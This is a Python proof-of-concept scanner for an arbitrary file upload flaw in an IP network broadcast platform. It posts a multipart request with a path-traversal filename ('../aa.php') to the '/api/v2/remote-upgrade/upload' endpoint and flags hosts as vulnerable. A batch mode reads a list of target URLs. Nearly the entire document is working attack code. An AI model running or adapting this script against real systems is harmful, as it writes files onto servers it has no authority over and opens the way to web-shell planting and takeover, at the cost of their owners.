import requests
import argparse


def IP(url):
    create_url = url + "/api/v2/remote-upgrade/upload"

    data = '''
------234561
Content-Disposition: form-data; name="file"; filename="../aa.php"
Content-Type: application/octet-stream

234561
------234561--
'''
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        , "Content-Type": "multipart/form-data; boundary=----234561"}

    try:
        req = requests.post(create_url, data=data, headers=headers, timeout=5)
        if (req.status_code == 200):
            if "link" in req.text:
                print(f"{url}存在文件上传漏洞")
                # print(req.text)
            else:
                print("该网址不存在文件上传漏洞")
    except:
        print("该网址无法访问或连接错误")


def IP_counts(filename):
    try:
        with open(filename, "r") as file:
            readline = file.readlines()
            for urls in readline:
                urls = urls.strip()
                if urls:
                    IP(urls)
    except:
        print("文件不存在或文件打开发生错误")


def start():
    logo = ''' .----------------.  .----------------. 
| .--------------. || .--------------. |
| |     _____    | || |   ______     | |
| |    |_   _|   | || |  |_   __ \   | |
| |      | |     | || |    | |__) |  | |
| |      | |     | || |    |  ___/   | |
| |     _| |_    | || |   _| |_      | |
| |    |_____|   | || |  |_____|     | |
| |              | || |              | |
| '--------------' || '--------------' |
 '----------------'  '----------------' 
    '''
    print(logo)


def main():
    parser = argparse.ArgumentParser(description="IP网络广播服务平台任意文件上传漏洞")
    parser.add_argument('-u', type=str, help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        IP(args.u)
    elif args.f:
        IP_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()